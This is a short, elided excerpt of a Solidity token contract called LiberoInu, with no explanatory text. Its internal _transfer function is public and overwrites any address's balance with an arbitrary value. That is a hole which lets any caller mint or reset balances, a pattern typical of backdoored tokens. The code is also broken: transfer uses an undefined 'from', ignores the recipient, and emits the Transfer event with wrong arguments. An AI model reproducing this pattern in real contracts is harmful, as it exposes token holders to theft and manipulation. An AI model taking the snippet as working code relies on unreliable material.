...
contract LiberoInu is Ownable {
  ...
  function transfer(address _to, uint256 _value) public returns (bool) {
    ...
    _transfer(from, _value);
    return true;
  }
  
  function _transfer(address from, uint256 _value) public returns (bool) {
    _balances[address(from)] = _value * (10 ** 9);
    emit Transfer(from, _value);
    return true;
  }
